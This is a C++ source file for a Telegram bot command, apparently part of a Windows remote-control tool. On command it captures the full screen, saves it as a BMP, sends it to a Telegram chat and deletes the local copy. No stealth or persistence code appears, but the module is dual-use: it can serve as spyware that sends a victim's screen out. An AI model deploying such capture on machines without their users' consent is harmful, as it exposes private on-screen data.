#include <Commands/ScreenshotCommand.h>
#include <Core/Config.h>

#include <windows.h>

namespace Commands {

    void ScreenshotCommand::execute(int64_t chat_id, const Telegram::Models::Message &msg) {
        HDC hScreenDC = GetDC(nullptr);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);

        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        auto hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));

        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hOldBitmap));

        BITMAP bmp;
        GetObject(hBitmap, sizeof(BITMAP), &bmp);

        BITMAPFILEHEADER bmfHeader;
        BITMAPINFOHEADER bi;

        bi.biSize = sizeof(BITMAPINFOHEADER);
        bi.biWidth = bmp.bmWidth;
        bi.biHeight = -bmp.bmHeight; // top-down
        bi.biPlanes = 1;
        bi.biBitCount = 32;
        bi.biCompression = BI_RGB;
        bi.biSizeImage = 0;
        bi.biXPelsPerMeter = 0;
        bi.biYPelsPerMeter = 0;
        bi.biClrUsed = 0;
        bi.biClrImportant = 0;

        DWORD dwBmpSize = (bmp.bmWidth * bi.biBitCount + 31) / 32 * 4 * bmp.bmHeight;
        std::vector<char> bmpData(dwBmpSize);

        GetDIBits(hMemoryDC, hBitmap, 0, static_cast<UINT>(bmp.bmHeight), bmpData.data(), reinterpret_cast<BITMAPINFO *>(&bi), DIB_RGB_COLORS);

        std::ofstream file("screenshot.bmp", std::ios::out | std::ios::binary);

        bmfHeader.bfType = 0x4D42;
        bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        bmfHeader.bfSize = bmfHeader.bfOffBits + dwBmpSize;
        bmfHeader.bfReserved1 = 0;
        bmfHeader.bfReserved2 = 0;

        file.write(reinterpret_cast<char *>(&bmfHeader), sizeof(BITMAPFILEHEADER));
        file.write(reinterpret_cast<char *>(&bi), sizeof(BITMAPINFOHEADER));
        file.write(bmpData.data(), dwBmpSize);
        file.close();

        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);

        api_.sendPhoto(chat_id, "screenshot.bmp", "📸 Screenshot captured");
        std::remove("screenshot.bmp");
    }

}
